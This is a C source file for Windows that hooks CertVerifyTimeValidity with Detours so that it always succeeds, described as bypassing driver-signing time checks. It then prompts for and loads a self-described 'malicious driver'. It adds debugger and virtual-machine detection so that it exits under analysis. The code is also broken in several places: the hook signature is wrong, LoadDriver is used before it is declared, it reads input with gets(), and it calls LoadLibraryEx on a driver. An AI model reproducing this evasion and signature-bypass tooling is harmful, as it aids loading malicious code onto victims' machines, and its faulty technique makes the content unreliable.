#include <Windows.h>
#include <stdio.h>
#include "C:\\Detours\\include\\detours.h"

#pragma comment(lib, "detours.lib")

typedef BOOL(WINAPI* PVerifyFunction)(LPVOID, PCCERT_CONTEXT, DWORD, DWORD, LPVOID, PCERT_CHAIN_POLICY_PARA, PCERT_CHAIN_POLICY_STATUS);

BOOL WINAPI NewCertVerifyTimeValidity(LPVOID pTimeToVerify, PCCERT_CONTEXT pCertContext, DWORD dwFlags, LPVOID pvPara, PCERT_CHAIN_POLICY_PARA pPolicyPara, PCERT_CHAIN_POLICY_STATUS pPolicyStatus) {
    // Custom logic for manipulating driver signing time validity checks
    return TRUE;  // Bypass time validity checks
}

PVerifyFunction TrueCertVerifyTimeValidity = NULL;
HANDLE hDriverMutex;

BOOL WINAPI HookCertVerifyTimeValidity(LPVOID pTimeToVerify, PCCERT_CONTEXT pCertContext, DWORD dwFlags, LPVOID pvPara, PCERT_CHAIN_POLICY_PARA pPolicyPara, PCERT_CHAIN_POLICY_STATUS pPolicyStatus) {
    // Modify CertVerifyTimeValidity to call the custom implementation
    return NewCertVerifyTimeValidity(pTimeToVerify, pCertContext, dwFlags, pvPara, pPolicyPara, pPolicyStatus);
}

BOOL IsCustomDebuggerPresent() {
    return IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), NULL);
}

BOOL IsVirtualMachine() {
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    return sysInfo.dwNumberOfProcessors <= 1;
}

LONG WINAPI ExceptionHandler(EXCEPTION_POINTERS* ExceptionInfo) {
    printf("Exception caught: 0x%08x at address: 0x%p\n",
        ExceptionInfo->ExceptionRecord->ExceptionCode,
        ExceptionInfo->ExceptionRecord->ExceptionAddress);
    return EXCEPTION_EXECUTE_HANDLER;
}

BOOL IsValidPath(const char* path) {
    DWORD attributes = GetFileAttributesA(path);
    return (attributes != INVALID_FILE_ATTRIBUTES && !(attributes & FILE_ATTRIBUTE_DIRECTORY));
}

void LogMessage(const char* message) {
    FILE* logFile = fopen("log.txt", "a");
    if (logFile) {
        fprintf(logFile, "%s\n", message);
        fclose(logFile);
    }
}

int main() {
    hDriverMutex = CreateMutex(NULL, FALSE, NULL);
    if (hDriverMutex == NULL) {
        printf("Failed to create mutex. Exiting...\n");
        return 1;
    }

    if (IsCustomDebuggerPresent()) {
        LogMessage("Debugger detected! Exiting...");
        CloseHandle(hDriverMutex);
        return 1;
    }

    if (IsVirtualMachine()) {
        LogMessage("Virtual machine detected! Exiting...");
        CloseHandle(hDriverMutex);
        return 1;
    }

    __try {
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        TrueCertVerifyTimeValidity = (PVerifyFunction)DetourFindFunction("Crypt32.dll", "CertVerifyTimeValidity");
        if (TrueCertVerifyTimeValidity == NULL) {
            printf("Failed to find and hook CertVerifyTimeValidity function.\n");
            CloseHandle(hDriverMutex);
            return 1;
        }
        DetourAttach((PVOID*)&TrueCertVerifyTimeValidity, HookCertVerifyTimeValidity);
        DetourTransactionCommit();

        // Ask the user for the path of the malicious driver
        char driverPath[256];
        printf("||||[#] Enter the Path of unsigned driver please : ");
        gets(driverPath);

        // Validate the driver path
        if (strlen(driverPath) == 0 || !IsValidPath(driverPath)) {
            LogMessage("||||[-] Invalid path entered. Bye!!");
            printf("||||[-] Invalid path entered. Please enter a valid driver path next time. Bye!!\n");
            DetourDetach((PVOID*)&TrueCertVerifyTimeValidity, HookCertVerifyTimeValidity);
            DetourTransactionCommit();
            CloseHandle(hDriverMutex);
            return 1;
        }

        // Load the malicious driver
        if (!LoadDriver(driverPath)) { // Check if the driver was loaded successfully
            LogMessage("Failed to load driver. Exiting...");
            printf("Failed to load driver.\n");
            DetourDetach((PVOID*)&TrueCertVerifyTimeValidity, HookCertVerifyTimeValidity);
            DetourTransactionCommit();
            CloseHandle(hDriverMutex);
            return 1;
        }
        DetourDetach((PVOID*)&TrueCertVerifyTimeValidity, HookCertVerifyTimeValidity);
        DetourTransactionCommit();

        printf("Malicious driver loaded successfully.\n");
        LogMessage("Malicious driver loaded successfully.");
    }
    __except (ExceptionHandler(GetExceptionInformation())) {
        LogMessage("An exception occurred. Exiting...");
        printf("An exception occurred. Exiting...\n");
    }

    CloseHandle(hDriverMutex);
    return 0;
}

int LoadDriver(char* driverPath) {
    WaitForSingleObject(hDriverMutex, INFINITE);

    HANDLE hDriver = LoadLibraryEx(driverPath, 0, LOAD_LIBRARY_SEARCH_SYSTEM32);
    if (hDriver == NULL) {
        ReleaseMutex(hDriverMutex);
        return FALSE;
    }
    FreeLibrary(hDriver);

    ReleaseMutex(hDriverMutex);
    return TRUE;
}